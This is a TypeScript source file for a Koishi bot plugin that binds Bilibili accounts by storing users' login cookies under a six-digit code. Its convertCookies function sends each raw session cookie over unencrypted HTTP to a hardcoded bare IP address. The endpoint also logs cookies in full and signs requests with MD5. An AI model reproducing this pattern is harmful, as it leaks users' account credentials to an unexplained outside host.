import '@koishijs/plugin-server';
import { Config } from '../../index';
import { randomInt } from '../../utils/pseudo_random_helper';
import crypto from 'crypto';
import { Context } from 'koishi';

export const name = 'cookie-binder';

export interface Cookie {
    name: string; // Cookie 名称
    value: string; // Cookie 值
    domain: string; // Cookie 域名，自动推断为 .bilibili.com
    path: string; // Cookie 路径，默认为 /
    expires: number; // 过期时间戳，从 Cookie 中解析或设置为 30 天后
    httpOnly: boolean; // 是否仅 HTTP 访问，重要 Cookie 设为 true
    secure: boolean; // 是否仅 HTTPS 传输，默认 true
    sameSite: string; // 同站限制策略，默认 Lax
}

interface BiliBind {
    bindCode: number;
    cookie: string;
    cookieInfo: Cookie[];
    mid: number;
    userName: string;
    createdAt: number;
}

declare module 'koishi' {
    interface Tables {
        bili_bind: BiliBind;
    }
}

// Cookie 转换
async function convertCookies(cookie: string): Promise<Cookie[]> {
    try {
        const response = await fetch('http://47.117.27.240:3000/api/convert', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookies: cookie }),
        });

        if (!response.ok) {
            return [];
        }

        const result = await response.json();
        return result._default['1'].value;
    } catch (error) {
        return [];
    }
}

export function cookie(ctx: Context, config: Config) {
    ctx.database.extend(
        'bili_bind',
        {
            bindCode: 'unsigned',
            cookie: 'string',
            cookieInfo: 'json',
            mid: 'unsigned',
            userName: 'string',
            createdAt: 'unsigned',
        },
        {
            primary: 'bindCode',
        }
    );

    ctx.server.post('/api/bind-cookie', async (koaCtx: any) => {
        try {
            let body = koaCtx.request.body;
            if (!body) {
                koaCtx.response.body = { error: 'Invalid JSON body' };
                return (koaCtx.status = 400);
            }

            ctx.logger('cookie').info(JSON.stringify(body));

            const md5 = body['md5'];
            const original = body['original'];
            const cookie = body['cookie'];
            const userName = body['userName'];
            const mid = body['mid'];
            if (!md5 || !original || !cookie || !userName || !mid) {
                koaCtx.response.body = {
                    error: 'Missing required fields (md5, original, cookie, userName, mid)',
                };
                return (koaCtx.status = 400);
            }

            // 计算原始字符串的 MD5（如果有 secretKey，使用 HMAC；否则纯 MD5）
            let computedHash: string;
            if (config.bili.secretKey) {
                const hmac = crypto.createHmac('md5', config.bili.secretKey);
                hmac.update(original);
                computedHash = hmac.digest('hex');
            } else {
                computedHash = crypto.createHash('md5').update(original).digest('hex'); // 优化：明确纯 MD5
            }

            if (computedHash !== md5) {
                koaCtx.response.body = {
                    error: 'Invalid MD5 signature for original string',
                };
                return (koaCtx.status = 400);
            }

            let bindCode: number | null = null;
            let attempts = 0;
            const maxAttempts = 10;

            while (!bindCode && attempts < maxAttempts) {
                const candidate = randomInt(100000, 999999);

                const existing = await ctx.database.get('bili_bind', candidate);
                if (!existing || existing.length === 0) {
                    bindCode = candidate;
                } else {
                    attempts++;
                }
            }

            if (!bindCode) {
                koaCtx.response.body = {
                    error: 'Failed to generate unique bindCode after max attempts',
                };
                return (koaCtx.status = 500);
            }

            const cookieInfo: Cookie[] = await convertCookies(cookie);
            if (cookieInfo.length === 0) {
                // 优化：检查转换结果
                koaCtx.response.body = { error: 'Failed to convert cookies' };
                return (koaCtx.status = 400);
            }

            const now = Date.now();
            await ctx.database.create('bili_bind', {
                bindCode,
                cookie,
                cookieInfo,
                mid,
                userName,
                createdAt: now,
            });

            // 响应成功
            koaCtx.response.body = { success: true, bindCode };
            koaCtx.status = 200;
        } catch (error) {
            ctx.logger('cookie').error('Bind cookie error:', error);
            koaCtx.response.body = { error: 'Internal server error' };
            koaCtx.status = 500;
        }
    });

    ctx.setInterval(
        async () => {
            // 每小时
            const oneHourAgo = Date.now() - 3600000;
            const expiredRecords = await ctx.database.get('bili_bind', {
                createdAt: { $lt: oneHourAgo },
            });
            for (const record of expiredRecords) {
                await ctx.database.remove('bili_bind', {
                    bindCode: record.bindCode,
                });
                ctx.logger('cookie').info(`自动清理过期绑定码：${record.bindCode}`);
            }
        },
        7 * 24 * 60 * 60 * 1000
    ); // 每 7 天运行一次
}
